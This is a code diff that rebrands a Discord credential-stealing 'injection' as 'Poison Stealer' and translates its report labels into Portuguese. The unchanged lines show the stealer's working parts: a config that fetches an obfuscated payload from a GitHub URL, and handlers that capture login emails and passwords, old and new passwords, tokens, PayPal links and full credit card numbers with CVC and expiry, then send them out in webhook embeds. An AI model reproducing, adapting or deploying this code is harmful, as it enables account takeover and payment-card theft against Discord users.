@@ -14,8 +14,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Empyrean Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/imgs/pfp.png', 
+  embed_name: 'Poison Stealer', 
+  embed_icon: 'https://raw.githubusercontent.com/traxzzy/Injectiondc/main/koringa.jpg', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
 
@@ -671,13 +671,13 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '**Informações da conta**',
+            value: `Email: **${email}**\nSenha: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro: **${nitro}**\nBadges: **${badges}**\nPagamento: **${billing}**`,
             inline: false,
           },
           {
@@ -711,13 +711,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: '**Senha alterada**',
+            value: `Email: **${json.email}**\nSenha antiga: **${oldpassword}**\nNova senha: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro: **${nitro}**\nBadges: **${badges}**\nPagamento: **${billing}**`,
             inline: true,
           },
           {
@@ -750,13 +750,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: '**Email Alterado**',
+            value: `Novo Email: **${email}**\nSenha: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro: **${nitro}**\nBadges: **${badges}**\nPagamento: **${billing}**`,
             inline: true,
           },
           {
@@ -789,13 +789,13 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            name: '**Paypal Adicionado**',
+            value: `Hora de comprar nitro baby 😩`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro: **${nitro}*\nBadges: **${badges}**\nPagamento: **${billing}**`,
             inline: false,
           },
           {
@@ -828,13 +828,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**Cartão de crédito Adicionado**',
+            value: `Número do Cartação: **${number}**\nCVV: **${cvc}**\nExpiração do Cartão: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro: **${nitro}**\nBadges: **${badges}**\nPagamento: **${billing}**`,
             inline: true,
           },
           {
@@ -869,13 +869,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            name: '**Nitro Comprado**',
+            value: `**Código no nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro: **${nitro}**\nBadges: **${badges}**\nPagamento: **${billing}**`,
             inline: true,
           },
           {
